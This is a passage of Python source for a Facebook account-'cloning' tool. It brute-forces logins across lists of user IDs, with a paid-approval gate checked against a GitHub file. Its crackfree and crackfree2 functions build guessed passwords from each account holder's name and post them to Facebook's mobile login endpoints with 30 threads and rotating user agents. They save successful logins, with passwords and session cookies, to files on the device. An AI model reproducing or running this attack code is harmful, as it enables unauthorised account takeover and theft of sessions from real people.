        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python Cyber-V19.py")
        exit()

#-----------------------------------[ Approval ]--------------------------------------#
def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  letter = "𝐂𝐲𝐛𝐞𝐫-𝐌𝐚𝐟𝐢𝐚_"
  try:
    httpCaht = requests.get('https://github.com/Cyber-Mafia-Team/Control-Room-Center/blob/main/Aporoval.txt').text
    if id in httpCaht:
      print("\33[1;32m[•] 𝐘𝐨𝐮 𝐤𝐞𝐲 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐲 𝐀𝐩𝐨𝐫𝐨𝐯𝐞𝐝")
      d = (f"WELCOME {sound} TO CYBER MAFIA  FILE CLONING TOOLS")
      create_audio(d,"test.mp3")
      play_audio("test.mp3")
      time.sleep(0.2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      
      menu()
    else:
      print("\33[1;32m         𝐂𝐨𝐧𝐝𝐢𝐭𝐢𝐨𝐧 :- ")
      print("\33[1;30m    ==============================")
      print("\33[1;34m [•] 𝑰𝒏𝒗𝒊𝒕𝒆 𝒚𝒐𝒖𝒓 500 𝒇𝒓𝒊𝒆𝒏𝒅 𝒊𝒏 𝒐𝒖𝒓 𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 𝑮𝒓𝒐𝒖𝒑 ")
      print("\33[1;35m [•] 𝙅𝙤𝙞𝙣 𝙊𝙪𝙧 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 ")
      print("\33[1;36m [•] 𝙄𝙣𝙫𝙞𝙩𝙚 𝙮𝙤𝙪 𝙖𝙡𝙡 𝙛𝙧𝙞𝙚𝙣𝙙𝙨 𝙗𝙮 𝙪𝙨𝙞𝙣𝙜 𝙁𝙖𝙘𝙚𝙗𝙤𝙤𝙠 𝙡𝙞𝙩𝙚 𝙖𝙥𝙥 𝙞𝙣 𝙤𝙪𝙧 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 𝙋𝙖𝙜𝙚 ")
      print('\33[1;37m=========================================================')
      print("\33[1;37m[•] Your Key : \33[1;32m"+letter+id)
      print('\33[1;37m=========================================================')
      print('\033[1;31m[!] 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝑶𝒖𝒓 𝐜𝐨𝐧𝐝𝐢𝐭𝐢𝐨𝐧 𝐭𝐡𝐞𝐧 𝐠𝐞𝐭 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥 ')
      print('\33[1;37m=========================================================')
      print ('\33[1;32m[•] 𝑪𝒍𝒊𝒄𝒌 𝑬𝒏𝒕𝒆𝒓 𝑻𝒐 𝑺𝒆𝒏𝒕 𝑲??𝒚 𝑨𝒅𝒎𝒊𝒏 𝑰𝒏𝒃𝒐𝒙')
      os.system('espeak -a 300 " ᴘʀᴇꜱꜱ ᴇɴᴛᴇʀ ᴛᴏ ꜱᴇɴᴛ ᴋᴇʏ ɪɴᴛᴏ ᴀᴅᴍɪɴ"')
      input('\33[1;32m[•] Ｃｌｉｃｋ Ｅｎｔｅｒ >')
      tks = ('AssalamuAlaylum%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+letter+id);os.system('xdg-open https://https://m.me/Innocent.DR4G0N.HACKER?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
def ckx():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    server = requests.get(f'https://github.com/Cyber-Mafia-Team/Control-Room-Center/blob/main/Aporoval.txt').text
    try:
        httpCaht = requests.get(f"https://github.com/Cyber-Mafia-Team/Control-Room-Center/blob/main/Aporoval.txt").text
        if id in httpCaht:
            msg = str(os.geteuid())
            #pass
        else:
            msg = str(os.geteuid())
            quite()
    except:
            sys.exit()


#-----------------------------------[ Access Key ]--------------------------------------#
def access():
    correct_access_key = "END"
    attempts = 1
    max_attempts = 2  # Set the maximum number of login attempts
    os.system("clear")
    

    while attempts < max_attempts:
        access_key = input('\033[1;32m  ══➻\033[1;34m Enter Access Key: \033[1;97m')

        if access_key == correct_access_key:
            print("       𝗔𝗰𝗰𝗲𝘀𝘀 𝗚𝗿𝗮𝗻𝘁𝗲𝗱 ✅")
            b = (f"Access Granted")
            create_audio(b,"test.mp3")
            play_audio("test.mp3")
            time.sleep(5)
            break
        else:
            print("Access denied. Please try again.")
            c = (f"Your r not permitted to use this tools")
            create_audio(c,"test.mp3")
            play_audio("test.mp3")
            attempts += 1
    else:
        print("Maximum login attempts reached. Exiting.");exit()
        
       
#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.03)
def menu():
    os.system('clear')
    ckx()
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;94mUSER NAME\033[1;91m :\033[1;96m "+sound)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;92mTODAY'S DATE :\033[1;92m "+date)
    print('\033[0;97m=========================================================')
    print(f"""\033[97;1m[ A ] \033[1;33m𝑭𝒊𝒍𝒆 𝑪𝒓𝒆𝒂𝒕𝒆""")
    print(f"""\033[97;1m[ B ] \033[1;30m𝑭𝒊𝒍𝒆 𝑪𝒍𝒐𝒏𝒊𝒏𝒈         """)
    print("""\033[97;1m[ C ] \033[0;93mCONTACT WITH ADMIN""")
    print("""\033[97;1m[ D ] \033[0;91mEXIT""")
    print('\033[0;97m=========================================================')
    CYBER = input('\x1b[1;92m[+] CHOOSE: ')
    if CYBER in ["A","a"]:
    	os.system("python Dump.py")  
    elif CYBER in ["B","b"]:
    	crack_file()       
    elif CYBER in ["C','c"]:
    	os.system('xdg-open https://wa.me/+8801330312890')
    elif CYBER in [" D","d"]:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=========================================================')
        animation(' [×] DONE EXIT ')
        exit()                    
    else:
        print('\033[0;97m=========================================================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 #-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print('\033[0;91m=========================================================')
    print('\033[1;32m[ Put File Example:  /sdcard/filename.txt  Etc...]')
    e = (f"Sir Please Give you File Location in your Storage")
    create_audio(e,"test.mp3")
    play_audio("test.mp3")
    o = input('\033[97;1m[\033[92;1m+\033[1;30m] INPUT FILE LOCATION :\033[92;1m ')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;91m=========================================================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
 
#-------------[ SETTING ]---------------#
 
def setting():
    #print('\033[0;91m=========================================================')
    ####print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;90mCLONING FOR ONLY OLD IDz")
   # print("\033[97;1m[\033[92;1m1\033[97;1m] \033[1;98mＳｔａｒｔ　Ｃｌｏｎｉｎｇ")
   # print('\033[0;91m=========================================================')
    hu = '1'
    if hu in ['0','00']:
        for tua in sorted(id):
            id2.append(tua)
    #elif hu in ['2','02']:
        #muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['1','01']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mSTART CLONING")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    #os.system("xdg-open https://www.facebook.com/Tutul.King.Ok.Bro")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['9','09']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
   
    os.system("clear")
    print(logo)
    print('\033[0;91m=========================================================')
    print(" [1] Server M")
    print(" [2] Server Mbasic")
    print(" [3] Server Free")
    print(" [4] Server P")
    print(" [5] Server X")
    print(" [6] Server d")
    print(" [7] Server t")
    print(" [8] Server web")
    print(" [9] Server Touch ")
    
    
    gxd = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    if gxd in ["1","1 "]:
        fbs="m"
        fb1="M1"
    elif gxd in ["2","2 "]:
        fbs="mbasic"
        fb2="M2"
    elif gxd in ["3","3 "]:
        fbs="free"
        fb3="M3"
    elif gxd in ["4","4 "]:
        fbs="p"
        fb4="M4"
    elif gxd in ["5","5 "]:
        fbs="x"
        fb5="M5"
    elif gxd in ["6","6 "]:
        fbs="d"
        fb6="M6"
    elif gxd in ["7","7 "]:
        fbs="t"
        fb7="M7"
    elif gxd in ["8","8 "]:
        fbs="web"
        fb8="M8"
    else:
        fbs="touch"
        fb9="M9"
    os.system('clear')
    ckx()
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;97mUSER NAME\033[1;91m :\033[1;97m "+sound)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;91mTODAY'S DATE :\033[1;90m "+date)
    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;91mYOUR TOTAL IDz \033[0;97m:\033[1;93m ',str(len(id)))
    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;228mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
    print('\033[0;97m==============================================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            fb = fbs
            fbsd = gxd
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'786')
                    pwv.append(nmf)
                    pwv.append(nmf+'@')
                    pwv.append('57273200')
                    pwv.append('59039200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'2023')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'786')
                    pwv.append(nmf)
                    pwv.append(nmf+'@')
                    pwv.append('57273200')
                    pwv.append('59039200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@##')
                    pwv.append(frs+'2023')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crackfree,idf,pwv,fb,fbsd)
            elif 'free' in method:
                pool.submit(crackfree2,idf,pwv,fb,fbsd)
            elif 'touch' in method:
                pool.submit(crackfree2,idf,pwv,fb,fbsd)
            elif 'mbasic' in method:
                pool.submit(crackfree2,idf,pwv,fb,fbsd)
            else:
                pool.submit(crackfree2,idf,pwv,fb,fbsd)
    print('\n\033[1;37m===============================================================')
    print('𝐓𝐡𝐚𝐧𝐤𝐬 𝐅𝐨𝐫 𝐮𝐬𝐢𝐧𝐠 𝐨𝐮𝐫 𝐭𝐨𝐨𝐥𝐬')
    print('𝗣𝗹𝗲𝗮𝘀𝗲 𝗴𝗶𝘃𝗲 𝘁𝗵𝗶𝘀 𝗿𝗲𝘃𝗶𝗲𝘄 𝗼𝗻 𝗼𝘂𝗿 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗴𝗿𝗼𝘂𝗽')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[91;1m] 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡 :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[95;1m] 𝘾𝙝𝙚𝙘𝙠𝙥𝙤𝙞𝙣𝙩 :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===============================================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    approval()
    exit()
 #----------------------------[ Year Count ]-------------------------------------#
def CYBER(idf):
    if len(idf)==15:
        if idf[:10] in ['1000000000']       :mafiya = ' 2009'
        elif idf[:9] in ['100000000']       :mafiya = '~> 2009'
        elif idf[:8] in ['10000000']        :mafiya = '~> 2009'
        elif idf[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:mafiya = '~> 2009'
        elif idf[:7] in ['1000006','1000007','1000008','1000009']:mafiya = ' 2010'
        elif idf[:6] in ['100001']          :mafiya = '~> 2010/2011'
        elif idf[:6] in ['100002','100003'] :mafiya = '~> 2011/2012'
        elif idf[:6] in ['100004']          :mafiya = '~> 2012/2013'
        elif idf[:6] in ['100005','100006'] :mafiya = '~> 2013/2014'
        elif idf[:6] in ['100007','100008'] :mafiya = '~> 2014/2015'
        elif idf[:6] in ['100009']          :mafiya = '~> 2014/2015'
        elif idf[:5] in ['10001']           :mafiya = '~> 2015/2016'
        elif idf[:5] in ['10002']           :mafiya = '~> 2016/2017'
        elif idf[:5] in ['10003']           :mafiya = '~> 2018/2019'
        elif idf[:5] in ['10004']           :mafiya = '~> 2019/2020'
        elif idf[:5] in ['10005']           :mafiya = '~> 2020'
        elif idf[:5] in ['10006','10007','']:mafiya = '~> 2021'
        elif idf[:5] in ['10008']           :mafiya = '~> 2022'
        elif idf[:5] in ['10009','6155']       :mafiya = '~> 2023'
        else:mafiya=''
    elif len(idf) in [9,10]:
        mafiya= '~> 2008/2009'
    elif len(idf)==8:
        mafiya = '~> 2007/2008'
    elif len(idf)==7:
        mafiya = '~> 2006/2007'
    else:mafiya=''
    return mafiya
#--------------------[ METHOD 1 ]-----------------#
 
def crackfree(idf,pwv,fb,fbsd):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    #fbsd = fb1
    sys.stdout.write(f"\r\033[10;50m{bo}[ꜱᴄᴀɴɴɪɴɢ <M{fbsd}>]{P} [{H}{loop}{P}] >~< [{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] >~< [{H}CP{bo}•{H}{cp}{P}] >~< [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({f"Host":'{fb}.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://{fb}.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get(f'https://{fb}.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {f'Host': '{fb}.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'dpr': '2.3375000953674316','upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post(f'https://{fb}.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\x1b[38;5;76m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                print(f"\033[33;91mＣｈｅｃｋｐｏｉｎｔ╔══➻😭 \033[38;5;46mᴜɪᴅ      ╔══➻ \033[0;36m{idf} ")
                print(f"\033[33;91mＣｈｅｃｋｐｏｉｎｔ╚══➻😭 \033[38;5;46m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╚══➻ \033[0;91m{pw}")
                print(f"\033[1;32m𝑪𝒓𝒆𝒂𝒕𝒊𝒐𝒏 𝑫𝒂𝒕𝒆 "+CYBER(idf)+"")
                create_audio(g,"test.mp3")
                play_audio("test.mp3")
                print('\x1b[38;5;50m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                open('/sdcard/M1•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif twf in po.cookies.get_dict().keys():
            	print('\x1b[38;5;50m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
            	print(f'\r\033[0;98m[𝟐𝐅] {idf} • {pw}')
            	print('\x1b[38;5;50m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
            	break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\x1b[38;5;76m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                print(f"\033[33;1m𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ╔══➻🔥 \033[38;5;96m𝑼𝑰𝑫      ╔══➻\033[38;5;86m {idf} ")
                print(f"\033[33;1m𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ╠══➻🔥 \033[38;5;96m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╠══➻\033[0;91m {pw}")
                print(f"\033[33;1m𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆   ╚══➻💎 \033[38;5;96m𝑪𝒐𝒐𝒌𝒊𝒆𝒔  ╚══➻ \033[1;97m{kuki}")
                print(f"\033[1;32m𝑪𝒓𝒆𝒂𝒕𝒊𝒐𝒏 𝑫𝒂𝒕𝒆 "+CYBER(idf)+"")
                print('\x1b[38;5;76m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                open('/sdcard/M1•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( idf+' • '+pw+' | '+kuki+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE--2 ]-------------------#
 
def crackfree2(idf,pwv,fb,fbsd):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ꜱᴄᴀɴɴɪɴɢ <{fbsd}>]{P} [{H}{loop}{P}]{P} >~< [{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] >~< [CP{P}•{H}{cp}{P}] >< [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({f"Host":'{fb}.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://{fb}.facebook.com/","accept-encoding":"gzip, deflate br",'X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True',"accept-language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get(f'https://{fb}.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {f'Host': '{fb}.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'dpr': '2.3375000953674316','upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True', 'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post(f'https://{fb}.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\x1b[38;5;76m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                print(f"\033[33;91mＣｈｅｃｋｐｏｉｎｔ╔══➻😭 \033[38;5;46mᴜɪᴅ      ╔══➻ \033[0;36m{idf} ")
                print(f"\033[33;91mＣｈｅｃｋｐｏｉｎｔ╚══➻😭 \033[38;5;46m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╚══➻ \033[0;91m{pw}")
                print(f"\033[1;32m𝑪𝒓𝒆𝒂𝒕𝒊𝒐𝒏 𝑫𝒂𝒕𝒆 "+CYBER(idf)+"")
                g = (f"Sir Bad Luck. This is CP ID")
                create_audio(g,"test.mp3")
                play_audio("test.mp3")
                print('\x1b[38;5;50m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                open('/sdcard/M2•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif twf in po.cookies.get_dict().keys():
            	print('\x1b[38;5;50m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
            	print(f'\r\033[0;98m[𝟐𝐅] {idf} • {pw}')
            	print('\x1b[38;5;50m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
            	break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\x1b[38;5;76m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                print(f"\033[33;1m𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ╔══➻🔥 \033[38;5;96m𝑼𝑰𝑫      ╔══➻\033[38;5;86m {idf} ")
                print(f"\033[33;1m𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ╠══➻🔥 \033[38;5;96m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╠══➻\033[0;91m {pw}")
                print(f"\033[33;1m𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆   ╚══➻💎 \033[38;5;96m𝑪𝒐𝒐𝒌𝒊𝒆𝒔  ╚══➻ \033[1;97m{kuki}")
                print(f"\n\033[1;32m𝑪𝒓𝒆𝒂𝒕𝒊𝒐𝒏 𝑫𝒂𝒕𝒆 "+CYBER(idf)+"")
                print('\x1b[38;5;76m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
                open('/sdcard/M2•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( idf+' • '+pw+' | '+kuki+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()